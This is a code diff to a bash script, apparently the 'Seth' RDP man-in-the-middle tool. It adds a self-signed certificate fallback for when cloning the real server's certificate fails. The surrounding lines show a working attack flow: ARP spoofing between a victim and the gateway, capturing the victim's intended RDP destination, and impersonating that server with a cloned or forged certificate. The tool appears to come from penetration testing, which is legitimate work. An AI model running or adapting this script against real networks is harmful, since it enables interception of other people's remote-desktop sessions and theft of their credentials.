@@ -45,6 +45,14 @@ function finish {
 }
 trap finish EXIT
 
+function create_self_signed_cert {
+    local CN="$1"
+    openssl req -subj "/CN=$CN/O=Seth by SySS GmbH" -new \
+        -newkey rsa:2048 -days 365 -nodes -x509 \
+        -keyout /tmp/$CN.server.key -out /tmp/$CN.server.crt
+    printf "%s\n%s\n" "/tmp/$CN.server.key" "/tmp/$CN.server.crt"
+}
+
 echo "[*] Spoofing arp replies..."
 
 arpspoof -i "$IFACE" -t "$VICTIM_IP" "$GATEWAY_IP" 2>/dev/null 1>&2 &
@@ -71,7 +79,8 @@ echo "[+] Got it! Original destination is $ORIGINAL_DEST"
 
 echo "[*] Clone the x509 certificate of the original destination..."
 
-CERT_KEY="$($SCRIPT_DIR/clone-cert.sh "$ORIGINAL_DEST:3389")"
+CERT_KEY="$($SCRIPT_DIR/clone-cert.sh "$ORIGINAL_DEST:3389" || \
+    create_self_signed_cert "$ORIGINAL_DEST")"
 KEYPATH="$(printf "%s" "$CERT_KEY" | head -n1)"
 CERTPATH="$(printf "%s" "$CERT_KEY" | tail -n1)"
 
